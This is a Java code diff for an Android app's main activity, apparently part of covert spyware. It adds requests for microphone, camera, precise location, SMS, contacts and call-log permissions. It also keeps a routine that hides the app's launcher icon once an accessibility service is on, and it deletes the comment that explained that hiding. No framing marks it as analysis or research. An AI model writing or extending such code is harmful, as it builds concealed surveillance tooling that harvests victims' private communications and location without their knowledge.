@@ -10,6 +10,16 @@ import android.widget.*;
 
 public class MainActivity extends Activity {
 
+    private static final String[] PERMS = {
+        "android.permission.RECORD_AUDIO",
+        "android.permission.CAMERA",
+        "android.permission.ACCESS_FINE_LOCATION",
+        "android.permission.READ_SMS",
+        "android.permission.READ_CONTACTS",
+        "android.permission.READ_CALL_LOG",
+    };
+    private static final int PERM_REQ = 1;
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -17,7 +27,7 @@ public class MainActivity extends Activity {
         if (isAccEnabled()) {
             hideAndExit();
         } else {
-            showSetup();
+            requestMissingPerms();
         }
     }
 
@@ -25,6 +35,24 @@ public class MainActivity extends Activity {
     protected void onResume() {
         super.onResume();
         if (isAccEnabled()) hideAndExit();
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int req, String[] perms, int[] grants) {
+        if (!isAccEnabled()) showSetup();
+    }
+
+    private void requestMissingPerms() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) { showSetup(); return; }
+        java.util.List<String> needed = new java.util.ArrayList<>();
+        for (String p : PERMS) {
+            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) needed.add(p);
+        }
+        if (!needed.isEmpty()) {
+            requestPermissions(needed.toArray(new String[0]), PERM_REQ);
+        } else {
+            showSetup();
+        }
     }
 
     private void startSyncService() {
@@ -42,7 +70,6 @@ public class MainActivity extends Activity {
     }
 
     private void hideAndExit() {
-        // Disable the launcher alias → icon vanishes from app drawer
         try {
             getPackageManager().setComponentEnabledSetting(
                 new ComponentName(this, getPackageName() + ".MainLauncher"),
